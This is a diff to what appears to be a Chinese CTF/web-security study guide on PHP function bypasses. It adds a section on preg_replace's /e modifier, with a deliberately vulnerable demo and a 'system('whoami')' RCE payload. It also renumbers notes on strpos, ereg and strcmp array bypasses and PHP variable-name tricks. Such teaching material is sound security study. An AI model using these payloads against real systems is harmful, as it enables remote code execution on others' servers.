@@ -986,7 +986,31 @@ reponse = requests.post(url, data=data)
 print(reponse.text)
 ```
 
-### 8.6 `strpos()` 函数绕过
+### 8.6 `preg_replace`函数绕过
+
+`preg_replace` 是一个PHP中的函数，主要用于对某个字符串，执行符合自定义正则表达式的搜索和替换，主要格式如下：
+
+```php
+preg_replace(正则表达式,主字符串);  //搜索符合正则表达式的内容
+preg_replace(正则表达式,替换字符串,主字符串);  //替换符合正则表达式的内容
+```
+
+但这个函数可以被拿来恶意利用，产生PHP代码执行从而RCE：
+
+```php
+if (isset($_GET['a'])) {
+    echo "这是一个Demo";
+    echo preg_replace($_GET['a'],$_GET['b'],$_GET['c']);
+} else {
+    die("做不出来也没关系啦");
+}
+```
+
+众所周知，正则表达式可以使用一些修饰符列如 `i`/`m`/`g` 之类，而 `e` 就比较特殊：`/e` 修饰符会将替换字符串**作为PHP代码执行**
+
+Payload构造：`?a=/[0-9]/e&b=system('whoami')&c=1`
+
+### 8.7 `strpos()` 函数绕过
 
 ```php
 strpos ( string $haystack , mixed $needle , int $offset = 0 ) : int
@@ -996,7 +1020,7 @@ strpos ( string $haystack , mixed $needle , int $offset = 0 ) : int
 
 `strpos()` 函数如果传入数组，便会返回NULL
 
-### 8.7 `ereg()` 函数绕过
+### 8.8 `ereg()` 函数绕过
 
 ```php
 int ereg(string pattern, string originalstring, [array regs]);
@@ -1008,7 +1032,7 @@ int ereg(string pattern, string originalstring, [array regs]);
 - `ereg()` 只能处理字符串，遇到数组做参数返回NULL
 - 空字符串的类型是string，NULL的类型是NULL，false、true是Boolean类型
 
-### 8.8 `strcmp()` 函数绕过
+### 8.9 `strcmp()` 函数绕过
 
 ```php
 strcmp ( string $str1 , string $str2 ) : int
@@ -1040,9 +1064,9 @@ if (isset($pass)) {
 pass[]=Aabyss
 ```
 
-### 8.9 PHP变量名和传参特性
+### 8.10 PHP变量名和传参特性
 
-#### 8.9.1 PHP的变量名特性
+#### 8.10.1 PHP的变量名特性
 
 ```php
 if ($_GET['po_p.er'] === "w_ai_tan_ji") {
@@ -1065,7 +1089,7 @@ else{
 po[p.er=w_ai_tan_ji
 ```
 
-#### 8.9.2 PHP数字可与字符做运算
+#### 8.10.2 PHP数字可与字符做运算
 
 在PHP中，数字是可以和命令进行一些运算的，比如 `1-phpinfo()-2` 是可以成功执行phpinfo语句，同样的还有以下运算符：
 
